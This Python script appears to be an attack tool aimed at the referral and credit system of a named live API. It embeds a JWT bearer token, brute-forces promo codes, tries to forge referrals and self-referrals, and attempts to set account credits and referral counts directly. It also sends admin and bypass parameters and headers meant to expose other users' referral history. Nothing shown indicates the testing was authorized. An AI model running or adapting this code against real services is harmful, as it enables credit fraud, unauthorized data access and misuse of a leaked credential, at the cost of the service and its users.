#!/usr/bin/env python3
"""
COMPREHENSIVE REFERRAL SYSTEM ABUSE & CREDIT MANIPULATION TESTING
================================================================
Tests all possible attack vectors for referral system exploitation
"""

import requests
import json
from datetime import datetime
from typing import Dict, List, Tuple

# Color codes for output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Test configuration
BASE_URL = "https://api.vaunt.dev"
JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
USER_ID = 20254

# Results storage
results = {
    "timestamp": datetime.now().isoformat(),
    "discovery": [],
    "fake_referrals": [],
    "self_referral": [],
    "promo_codes": [],
    "credit_manipulation": [],
    "referral_count_manipulation": [],
    "bonus_claiming": [],
    "parameter_injection": [],
    "referral_history": [],
    "vulnerabilities": []
}

def make_request(method: str, endpoint: str, headers: Dict = None, data: Dict = None,
                 params: Dict = None, description: str = "") -> Tuple[int, Dict, str]:
    """Make HTTP request and return status, response, and error"""
    url = f"{BASE_URL}{endpoint}"

    default_headers = {
        "Authorization": f"Bearer {JWT_TOKEN}",
        "Content-Type": "application/json"
    }

    if headers:
        default_headers.update(headers)

    try:
        if method == "GET":
            resp = requests.get(url, headers=default_headers, params=params, timeout=10)
        elif method == "POST":
            resp = requests.post(url, headers=default_headers, json=data, timeout=10)
        elif method == "PATCH":
            resp = requests.patch(url, headers=default_headers, json=data, timeout=10)
        elif method == "PUT":
            resp = requests.put(url, headers=default_headers, json=data, timeout=10)
        else:
            return 0, {}, "Invalid method"

        try:
            response_data = resp.json()
        except:
            response_data = {"raw": resp.text}

        return resp.status_code, response_data, None
    except Exception as e:
        return 0, {}, str(e)

def print_test_header(title: str):
    """Print formatted test section header"""
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}{title}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.RESET}\n")

def print_result(test_name: str, status: int, response: Dict, error: str = None):
    """Print formatted test result"""
    if error:
        print(f"{Colors.RED}[ERROR] {test_name}{Colors.RESET}")
        print(f"  Error: {error}")
        return

    if status == 200 or status == 201:
        print(f"{Colors.GREEN}[{status}] {test_name}{Colors.RESET}")
        print(f"  Response: {json.dumps(response, indent=2)[:500]}")
    elif status == 401 or status == 403:
        print(f"{Colors.YELLOW}[{status}] {test_name} - BLOCKED{Colors.RESET}")
    elif status == 404:
        print(f"{Colors.BLUE}[{status}] {test_name} - NOT FOUND{Colors.RESET}")
    else:
        print(f"{Colors.MAGENTA}[{status}] {test_name}{Colors.RESET}")
        if response:
            print(f"  Response: {json.dumps(response, indent=2)[:300]}")

def test_referral_discovery():
    """Test 1: Discover referral endpoints"""
    print_test_header("TEST 1: REFERRAL ENDPOINT DISCOVERY")

    endpoints = [
        ("GET", "/v1/referral", None, None, "V1 Referral"),
        ("GET", "/v2/referral", None, None, "V2 Referral"),
        ("GET", "/v3/referral", None, None, "V3 Referral"),
        ("GET", "/v1/user/referrals", None, None, "V1 User Referrals"),
        ("GET", "/v2/user/referrals", None, None, "V2 User Referrals"),
        ("GET", "/v1/referral/code", None, None, "V1 Referral Code"),
        ("GET", "/v1/referral/stats", None, None, "V1 Referral Stats"),
        ("GET", "/v1/credits", None, None, "V1 Credits"),
        ("GET", "/v2/credits", None, None, "V2 Credits"),
        ("GET", "/v1/user/credits", None, None, "V1 User Credits"),
        ("GET", "/v2/user/credits", None, None, "V2 User Credits"),
        ("GET", "/v1/bonus", None, None, "V1 Bonus"),
        ("GET", "/v1/promo", None, None, "V1 Promo"),
        ("GET", "/v1/rewards", None, None, "V1 Rewards"),
        ("GET", "/v1/user/balance", None, None, "V1 User Balance"),
    ]

    for method, endpoint, data, params, desc in endpoints:
        status, response, error = make_request(method, endpoint, data=data, params=params)
        print_result(desc, status, response, error)

        results["discovery"].append({
            "endpoint": endpoint,
            "method": method,
            "status": status,
            "response": response,
            "exists": status not in [404, 0]
        })

        if status == 200:
            results["vulnerabilities"].append({
                "type": "Endpoint Discovery",
                "endpoint": endpoint,
                "severity": "INFO",
                "details": "Referral/credit endpoint found"
            })

def test_fake_referrals():
    """Test 2: Generate fake referrals"""
    print_test_header("TEST 2: FAKE REFERRAL GENERATION")

    tests = [
        ("POST", "/v1/referral/create", {"referredUserId": 99999}, None, "Create fake referral - userId"),
        ("POST", "/v1/referral/create", {"userId": 99999}, None, "Create fake referral - direct"),
        ("POST", "/v2/referral/register", {"referrer": USER_ID}, None, "V2 Register referral"),
        ("POST", "/v2/referral/register", {"referrerId": USER_ID, "refereeId": 99999}, None, "V2 Register with IDs"),
        ("POST", "/v1/user/refer", {"email": "fake@test.com"}, None, "Refer fake email"),
        ("POST", "/v1/referral/add", {"count": 10}, None, "Add referral count"),
        ("POST", "/v1/referral", {"referredEmail": "exploit@test.com"}, None, "V1 Referral with email"),
        ("POST", "/v2/referral", {"referredUserId": 88888}, None, "V2 Referral creation"),
    ]

    for method, endpoint, data, params, desc in tests:
        status, response, error = make_request(method, endpoint, data=data, params=params)
        print_result(desc, status, response, error)

        results["fake_referrals"].append({
            "test": desc,
            "endpoint": endpoint,
            "status": status,
            "payload": data,
            "response": response,
            "vulnerable": status in [200, 201]
        })

        if status in [200, 201]:
            results["vulnerabilities"].append({
                "type": "CRITICAL - Fake Referral Generation",
                "endpoint": endpoint,
                "severity": "CRITICAL",
                "cvss": 9.1,
                "details": f"Can generate fake referrals: {desc}",
                "payload": data
            })

def test_self_referral():
    """Test 3: Self-referral exploitation"""
    print_test_header("TEST 3: SELF-REFERRAL EXPLOITATION")

    # First, try to get user's own referral code
    status, response, error = make_request("GET", "/v1/referral/code")
    referral_code = None
    if status == 200 and isinstance(response, dict):
        referral_code = response.get("code") or response.get("referralCode")
        print(f"{Colors.GREEN}Found referral code: {referral_code}{Colors.RESET}")

    tests = [
        ("POST", "/v1/referral/apply", {"code": referral_code} if referral_code else {"code": "SELF"}, None, "Apply own referral code"),
        ("POST", "/v1/referral/claim", {"referrerId": USER_ID}, None, "Claim with own ID"),
        ("POST", "/v1/signup", {"referredBy": USER_ID}, None, "Signup with own ID"),
        ("POST", "/v2/referral/apply", {"userId": USER_ID, "referrerId": USER_ID}, None, "V2 Self-referral"),
    ]

    for method, endpoint, data, params, desc in tests:
        status, response, error = make_request(method, endpoint, data=data, params=params)
        print_result(desc, status, response, error)

        results["self_referral"].append({
            "test": desc,
            "status": status,
            "response": response,
            "vulnerable": status in [200, 201]
        })

        if status in [200, 201]:
            results["vulnerabilities"].append({
                "type": "HIGH - Self-Referral",
                "endpoint": endpoint,
                "severity": "HIGH",
                "cvss": 7.5,
                "details": f"User can refer themselves: {desc}",
                "payload": data
            })

def test_promo_codes():
    """Test 4: Brute force common promo codes"""
    print_test_header("TEST 4: PROMO CODE BRUTE FORCE")

    common_codes = [
        "WELCOME10", "FIRST10", "FREE", "NEWUSER", "VIP", "PREMIUM",
        "LAUNCH", "BETA", "ALPHA", "EARLYBIRD", "WELCOME", "START",
        "BONUS", "GIFT", "SPECIAL", "PROMO", "DISCOUNT", "FREE10",
        "FREE100", "CREDIT", "TRIAL", "TEST", "VAUNT", "FIRST",
        "NEW", "SIGNUP", "JOIN", "MEMBER", "ELITE", "GOLD"
    ]

    endpoints_to_try = [
        "/v1/referral/claim",
        "/v1/promo/apply",
        "/v1/promo/redeem",
        "/v1/credits/redeem",
        "/v2/promo/apply",
        "/v1/coupon/apply"
    ]

    for endpoint in endpoints_to_try:
        print(f"\n{Colors.BOLD}Testing endpoint: {endpoint}{Colors.RESET}")
        for code in common_codes:
            status, response, error = make_request("POST", endpoint, {"code": code})

            if status in [200, 201]:
                print_result(f"WORKING CODE: {code}", status, response, error)
                results["promo_codes"].append({
                    "code": code,
                    "endpoint": endpoint,
                    "status": status,
                    "response": response
                })
                results["vulnerabilities"].append({
                    "type": "HIGH - Working Promo Code",
                    "endpoint": endpoint,
                    "severity": "HIGH",
                    "cvss": 7.0,
                    "details": f"Valid promo code found: {code}",
                    "code": code
                })
            elif status not in [404, 0]:
                print(f"  [{status}] {code} - {response.get('message', '')[:50] if isinstance(response, dict) else ''}")

def test_credit_manipulation():
    """Test 5: Direct credit manipulation"""
    print_test_header("TEST 5: CREDIT MANIPULATION")

    tests = [
        ("PATCH", "/v1/user", {"credits": 9999}, None, "PATCH user credits"),
        ("PATCH", "/v2/user", {"credits": 9999}, None, "PATCH V2 user credits"),
        ("POST", "/v1/credits/add", {"amount": 1000}, None, "Add credits directly"),
        ("POST", "/v2/credits/add", {"amount": 1000}, None, "V2 Add credits"),
        ("POST", "/v1/user/balance", {"credits": 1000}, None, "Set balance"),
        ("PUT", "/v1/user/credits", {"credits": 5000}, None, "PUT user credits"),
        ("POST", "/v1/credits", {"credits": 2000}, None, "POST credits"),
        ("PATCH", "/v1/user", {"balance": 9999}, None, "PATCH balance"),
        ("POST", "/v1/user/credits/add", {"value": 1000}, None, "Add credit value"),
    ]

    for method, endpoint, data, params, desc in tests:
        status, response, error = make_request(method, endpoint, data=data, params=params)
        print_result(desc, status, response, error)

        results["credit_manipulation"].append({
            "test": desc,
            "endpoint": endpoint,
            "method": method,
            "status": status,
            "payload": data,
            "response": response,
            "vulnerable": status in [200, 201]
        })

        if status in [200, 201]:
            results["vulnerabilities"].append({
                "type": "CRITICAL - Credit Manipulation",
                "endpoint": endpoint,
                "severity": "CRITICAL",
                "cvss": 9.8,
                "details": f"Direct credit manipulation possible: {desc}",
                "payload": data
            })

def test_referral_count_manipulation():
    """Test 6: Referral count manipulation"""
    print_test_header("TEST 6: REFERRAL COUNT MANIPULATION")

    tests = [
        ("PATCH", "/v1/user", {"referralCount": 100}, None, "Set referral count"),
        ("PATCH", "/v1/user", {"referrals": 100}, None, "Set referrals"),
        ("POST", "/v1/referral/bulk-add", {"count": 50}, None, "Bulk add referrals"),
        ("PATCH", "/v2/user", {"referralCount": 200}, None, "V2 Set referral count"),
        ("POST", "/v1/referral/increment", {"count": 10}, None, "Increment referral count"),
    ]

    for method, endpoint, data, params, desc in tests:
        status, response, error = make_request(method, endpoint, data=data, params=params)
        print_result(desc, status, response, error)

        results["referral_count_manipulation"].append({
            "test": desc,
            "status": status,
            "response": response,
            "vulnerable": status in [200, 201]
        })

        if status in [200, 201]:
            results["vulnerabilities"].append({
                "type": "CRITICAL - Referral Count Manipulation",
                "endpoint": endpoint,
                "severity": "CRITICAL",
                "cvss": 8.5,
                "details": f"Can manipulate referral count: {desc}",
                "payload": data
            })

def test_bonus_claiming():
    """Test 7: Bonus claiming exploitation"""
    print_test_header("TEST 7: BONUS CLAIMING EXPLOITATION")

    tests = [
        ("POST", "/v1/referral/claim-bonus", {}, None, "Claim referral bonus"),
        ("POST", "/v1/referral/payout", {}, None, "Referral payout"),
        ("GET", "/v1/referral/rewards", None, None, "Get referral rewards"),
        ("POST", "/v1/bonus/claim", {"type": "referral"}, None, "Claim bonus by type"),
        ("POST", "/v1/rewards/claim", {}, None, "Claim rewards"),
        ("POST", "/v2/referral/claim", {}, None, "V2 Claim referral"),
        ("POST", "/v1/credits/claim", {"source": "referral"}, None, "Claim credits from referral"),
    ]

    for method, endpoint, data, params, desc in tests:
        status, response, error = make_request(method, endpoint, data=data, params=params)
        print_result(desc, status, response, error)

        results["bonus_claiming"].append({
            "test": desc,
            "status": status,
            "response": response,
            "accessible": status in [200, 201]
        })

def test_parameter_injection():
    """Test 8: Parameter injection for data exposure"""
    print_test_header("TEST 8: PARAMETER INJECTION")

    tests = [
        ("GET", "/v1/referral", None, {"showAll": "true"}, "Show all referrals"),
        ("GET", "/v1/referral", None, {"admin": "true"}, "Admin parameter"),
        ("GET", "/v1/referral", None, {"userId": USER_ID, "limit": 9999}, "High limit"),
        ("GET", "/v2/referral", None, {"includeAll": "true"}, "V2 Include all"),
        ("GET", "/v1/credits", None, {"showAll": "true"}, "Show all credits"),
        ("GET", "/v1/user/referrals", None, {"bypass": "true"}, "Bypass parameter"),
    ]

    # Also test with special headers
    special_headers = [
        {"x-bypass-validation": "true"},
        {"x-admin": "true"},
        {"x-debug": "true"},
        {"x-internal": "true"},
    ]

    for method, endpoint, data, params, desc in tests:
        status, response, error = make_request(method, endpoint, data=data, params=params)
        print_result(desc, status, response, error)

        results["parameter_injection"].append({
            "test": desc,
            "endpoint": endpoint,
            "params": params,
            "status": status,
            "response": response,
            "vulnerable": status == 200 and response
        })

        if status == 200 and isinstance(response, dict):
            # Check if we got more data than expected
            if isinstance(response, list) and len(response) > 10:
                results["vulnerabilities"].append({
                    "type": "HIGH - Parameter Injection Data Exposure",
                    "endpoint": endpoint,
                    "severity": "HIGH",
                    "cvss": 7.5,
                    "details": f"Parameter injection exposed excessive data: {desc}",
                    "params": params
                })

    # Test with special headers
    print(f"\n{Colors.BOLD}Testing with special headers:{Colors.RESET}")
    for header in special_headers:
        status, response, error = make_request("GET", "/v1/referral", headers=header)
        if status == 200:
            print_result(f"Header: {list(header.keys())[0]}", status, response, error)

def test_referral_history():
    """Test 9: Referral history exposure"""
    print_test_header("TEST 9: REFERRAL HISTORY & DATA EXPOSURE")

    tests = [
        ("GET", "/v1/user/referral-history", None, None, "User referral history"),
        ("GET", "/v2/referrals/list", None, None, "V2 Referrals list"),
        ("GET", "/v1/referrals", None, {"includeAll": "true"}, "All referrals"),
        ("GET", "/v1/referral/list", None, None, "Referral list"),
        ("GET", "/v1/admin/referrals", None, None, "Admin referrals endpoint"),
        ("GET", "/v2/referral/all", None, None, "V2 All referrals"),
    ]

    for method, endpoint, data, params, desc in tests:
        status, response, error = make_request(method, endpoint, data=data, params=params)
        print_result(desc, status, response, error)

        results["referral_history"].append({
            "test": desc,
            "status": status,
            "response": response,
            "data_exposed": status == 200 and response
        })

def get_current_credits():
    """Get current user credits/balance"""
    endpoints = [
        "/v1/user",
        "/v2/user",
        "/v1/user/credits",
        "/v1/credits"
    ]

    for endpoint in endpoints:
        status, response, error = make_request("GET", endpoint)
        if status == 200 and isinstance(response, dict):
            return response

    return None

def generate_report():
    """Generate final security report"""
    print_test_header("FINAL SECURITY ASSESSMENT REPORT")

    # Count vulnerabilities by severity
    critical = [v for v in results["vulnerabilities"] if v.get("severity") == "CRITICAL"]
    high = [v for v in results["vulnerabilities"] if v.get("severity") == "HIGH"]

    print(f"{Colors.BOLD}VULNERABILITY SUMMARY:{Colors.RESET}")
    print(f"  {Colors.RED}CRITICAL: {len(critical)}{Colors.RESET}")
    print(f"  {Colors.YELLOW}HIGH: {len(high)}{Colors.RESET}")
    print(f"  Total Vulnerabilities: {len(results['vulnerabilities'])}")

    print(f"\n{Colors.BOLD}KEY FINDINGS:{Colors.RESET}")

    # Referral endpoints
    referral_endpoints = [d for d in results["discovery"] if d["exists"]]
    print(f"\n1. Referral Endpoints Found: {Colors.GREEN if referral_endpoints else Colors.RED}{'YES' if referral_endpoints else 'NO'}{Colors.RESET}")
    if referral_endpoints:
        for ep in referral_endpoints[:5]:
            print(f"   - {ep['endpoint']} [{ep['status']}]")

    # Fake referrals
    fake_ref_vulns = [r for r in results["fake_referrals"] if r["vulnerable"]]
    print(f"\n2. Can Generate Fake Referrals: {Colors.RED if fake_ref_vulns else Colors.GREEN}{'YES - CRITICAL!' if fake_ref_vulns else 'NO'}{Colors.RESET}")
    if fake_ref_vulns:
        for v in fake_ref_vulns:
            print(f"   - {v['endpoint']}: {v['test']}")

    # Self-referral
    self_ref_vulns = [r for r in results["self_referral"] if r["vulnerable"]]
    print(f"\n3. Can Self-Refer: {Colors.RED if self_ref_vulns else Colors.GREEN}{'YES - HIGH RISK!' if self_ref_vulns else 'NO'}{Colors.RESET}")

    # Credit manipulation
    credit_vulns = [r for r in results["credit_manipulation"] if r["vulnerable"]]
    print(f"\n4. Can Manipulate Credits: {Colors.RED if credit_vulns else Colors.GREEN}{'YES - CRITICAL!' if credit_vulns else 'NO'}{Colors.RESET}")
    if credit_vulns:
        for v in credit_vulns:
            print(f"   - {v['endpoint']}: {v['test']}")

    # Promo codes
    print(f"\n5. Working Promo Codes Found: {Colors.YELLOW if results['promo_codes'] else Colors.GREEN}{len(results['promo_codes'])}{Colors.RESET}")
    if results['promo_codes']:
        for code in results['promo_codes']:
            print(f"   - {code['code']} on {code['endpoint']}")

    # Referral count manipulation
    count_vulns = [r for r in results["referral_count_manipulation"] if r["vulnerable"]]
    print(f"\n6. Can Manipulate Referral Count: {Colors.RED if count_vulns else Colors.GREEN}{'YES - CRITICAL!' if count_vulns else 'NO'}{Colors.RESET}")

    print(f"\n{Colors.BOLD}CRITICAL VULNERABILITIES:{Colors.RESET}")
    if critical:
        for i, vuln in enumerate(critical, 1):
            print(f"\n{i}. {Colors.RED}{vuln['type']}{Colors.RESET}")
            print(f"   Endpoint: {vuln['endpoint']}")
            print(f"   CVSS Score: {vuln.get('cvss', 'N/A')}")
            print(f"   Details: {vuln['details']}")
    else:
        print(f"{Colors.GREEN}No critical vulnerabilities found{Colors.RESET}")

    # Save results to JSON
    with open('/home/user/vaunt/api_testing/referral_abuse_results.json', 'w') as f:
        json.dump(results, indent=2, fp=f)

    print(f"\n{Colors.BOLD}Results saved to: /home/user/vaunt/api_testing/referral_abuse_results.json{Colors.RESET}")

def main():
    """Main testing orchestrator"""
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}")
    print("=" * 80)
    print("VAUNT REFERRAL SYSTEM & CREDIT MANIPULATION SECURITY TEST")
    print("=" * 80)
    print(f"{Colors.RESET}\n")

    print(f"{Colors.BOLD}Test Configuration:{Colors.RESET}")
    print(f"  Base URL: {BASE_URL}")
    print(f"  User ID: {USER_ID}")
    print(f"  JWT Token: {JWT_TOKEN[:50]}...")
    print(f"  Test Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    # Get baseline credits
    print(f"\n{Colors.BOLD}Getting baseline user data...{Colors.RESET}")
    baseline = get_current_credits()
    if baseline:
        print(f"  Current Data: {json.dumps(baseline, indent=2)[:300]}")

    # Run all tests
    test_referral_discovery()
    test_fake_referrals()
    test_self_referral()
    test_promo_codes()
    test_credit_manipulation()
    test_referral_count_manipulation()
    test_bonus_claiming()
    test_parameter_injection()
    test_referral_history()

    # Check if credits changed
    print(f"\n{Colors.BOLD}Checking for credit changes...{Colors.RESET}")
    final = get_current_credits()
    if final and baseline:
        print(f"  Final Data: {json.dumps(final, indent=2)[:300]}")
        if final != baseline:
            print(f"{Colors.RED}CREDITS/DATA CHANGED!{Colors.RESET}")

    # Generate report
    generate_report()

if __name__ == "__main__":
    main()
